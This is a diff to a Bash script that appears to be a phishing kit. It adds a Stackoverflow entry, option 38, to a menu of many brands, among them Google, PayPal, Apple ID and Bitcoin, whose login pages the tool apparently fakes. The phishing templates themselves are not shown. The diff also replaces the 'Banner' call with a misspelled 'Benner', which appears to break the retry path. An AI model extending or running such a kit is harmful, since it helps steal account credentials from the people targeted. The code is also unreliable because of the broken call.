@@ -14,7 +14,7 @@ Main() {
     printf "          ${RED}[03]${CYAN} Snapchat\e[0m       ${RED}[19]${CYAN} Shopify   \e[0m     ${RED}[35]${CYAN} iCloud\e[0m          \n"
     printf "          ${RED}[04]${CYAN} Twitter\e[0m        ${RED}[20]${CYAN} Messenger   \e[0m   ${RED}[36]${CYAN} Spotify\e[0m          \n"                
     printf "          ${RED}[05]${CYAN} Github\e[0m         ${RED}[21]${CYAN} GitLab   \e[0m      ${RED}[37]${CYAN} Netflix\e[0m          \n"                
-    printf "          ${RED}[06]${CYAN} Google\e[0m         ${RED}[22]${CYAN} Twitch   \e[0m               \n"
+    printf "          ${RED}[06]${CYAN} Google\e[0m         ${RED}[22]${CYAN} Twitch   \e[0m      ${RED}[38]${CYAN} Stackoverflow\e[0m         \n"
     printf "          ${RED}[07]${CYAN} Origin\e[0m         ${RED}[23]${CYAN} MySpace    \e[0m             \n"
     printf "          ${RED}[08]${CYAN} Yahoo\e[0m          ${RED}[24]${CYAN} Badoo   \e[0m                \n"        
     printf "          ${RED}[09]${CYAN} Linkedin\e[0m       ${RED}[25]${CYAN} VK   \e[0m                   \n"         
@@ -22,10 +22,10 @@ Main() {
     printf "          ${RED}[11]${CYAN} Wordpress\e[0m      ${RED}[27]${CYAN} devianART   \e[0m            \n"
     printf "          ${RED}[12]${CYAN} Microsoft\e[0m      ${RED}[28]${CYAN} Wi-Fi   \e[0m                \n"
     printf "          ${RED}[13]${CYAN} IGFollowers\e[0m    ${RED}[29]${CYAN} PayPal  \e[0m                \n"
-    printf "          ${RED}[14]${CYAN} Pinterest\e[0m      ${RED}[30]${CYAN} Steam  \e[0m                 \n"
-    printf "          ${RED}[15]${CYAN} Apple ID\e[0m       ${RED}[31]${CYAN} Bitcoin  \e[0m               \n"
-    printf "          ${RED}[16]${CYAN} Verizon\e[0m        ${RED}[32]${CYAN} Playstation  \e[0m           \e[1;94m \n"
-    printf "\n"
+    printf "          ${RED}[14]${CYAN} Pinterest\e[0m      ${RED}[30]${CYAN} Steam  \e[0m                              \n"
+    printf "          ${RED}[15]${CYAN} Apple ID\e[0m       ${RED}[31]${CYAN} Bitcoin  \e[0m                             \n"
+    printf "          ${RED}[16]${CYAN} Verizon\e[0m        ${RED}[32]${CYAN} Playstation  \e[0m           \e[1;94m                  \n"
+
     read -p "${YELLOW}Choose an option -->> ${GRAY}" option
 
     if [[ $option == 1 ]]; then
@@ -172,10 +172,14 @@ Main() {
     website="netflix"
     start
 
+    elif [[ $option == 38 ]]; then
+    website=stackoverflow
+    start
+
     else 
     printf "${RED}Invaild Oprion"
     sleep 1
-    { clear ; Banner ; Main ; }
+    { clear ; Benner ; Main ; }
     fi
 }
 
